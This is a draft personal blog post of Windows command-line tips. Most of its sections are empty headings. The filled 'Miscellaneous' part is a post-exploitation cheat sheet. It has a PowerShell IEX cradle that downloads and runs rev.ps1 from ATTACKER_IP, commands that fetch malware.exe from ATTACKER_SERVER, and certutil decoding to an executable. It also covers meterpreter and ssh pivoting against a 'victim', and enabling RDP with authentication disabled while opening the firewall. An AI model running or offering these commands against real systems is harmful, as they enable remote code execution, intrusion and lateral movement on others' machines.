---
layout: post
draft: true
title: "Windows (winnt) gems"
slug: "winnt"
date: "2022-05-11 21:02:04+11:00"
lastmod: "2022-05-11 21:02:04+11:00"
comments: false
categories:
  - winnt
tags:
  - winnt
  - windows
  - handy
---

- [Help and context](#help-and-context)
- [Execution policy](#execution-policy)
- [Operators](#operators)
- [Regex](#regex)
- [Flow Control](#flow-control)
- [Variables](#variables)
- [Functions](#functions)
- [Modules](#modules)
- [Module Management](#module-management)
    - [Good modules to run](#good-modules-to-run)
- [Filesystem](#filesystem)
- [Hashtables (Dictionary)](#hashtables-dictionary)
- [Windows Management Instrumentation (WMI)](#windows-management-instrumentation-wmi)
- [Async](#async)
    - [Filesystem events](#filesystem-events)
    - [Timers](#timers)
- [PowerShell drives](#powershell-drives)
- [Data (CRUD) management](#data-crud-management)
- [Damn handy](#damn-handy)

## Purpose

Modern Windows as we know it is a decendent of the original NT (new technology) code base started by the legendary [Dave Cutler](https://en.wikipedia.org/wiki/Dave_Cutler) and his team in 1988. Dave was known to have a distain for UNIX and took a different approach to building his new OS.

Windows is jam packed with weird and wonderful programs, shortcuts, boot modes, hacks; I wanted to start documenting the ones I find useful somewhere.


## File system locations

TODO



## Utility commands




## System information

- `sc query state=all` running daemons
- `tasklist /svc` show running processes and daemons
- `tasklist /m` show processes and DLLs
- `tasklist /S <ip> /v` remote process listing


## Networking


## Domain


## Remote


## Miscellaneous

### ACLs

```
icacls text.txt /grant Everyone:F
```

### Base64 decode

```
certutil -decode foo.b64 foo.exe
```

### Download file

```
IEX (New-Object System.Net.WebClient).DownloadString("http://ATTACKER_IP/rev.ps1")(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_SERVER/malware.exe", "C:\Windows\Temp\malware.exe")  Invoke-WebRequest "http://ATTACKER_SERVER/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"
```

### Firewall re-ruling

```
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
```

### Port forwarding

```
 # using plink 
 plink.exe -l user -pw pass123 192.168.1.56 -R 8080:127.0.0.1:8080
 
 # using meterpreterportfwd
 add -l attacker-port -p victim-port -r victim-ip
 portfwd add -l 3306 -p 3306 -r 192.168.1.56
 
 # Dynamic Pivoting using ssh with proxy chain
 ssh -D 9050 root@target
 
 # using ssh
 ssh -L localhost:8080:target:8080 root@targetip
```

### RDP enabling

```
# CMD 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
# Powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Optional
net localgroup "Remote Desktop Users" morph3 /add

# Re-ruling firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
```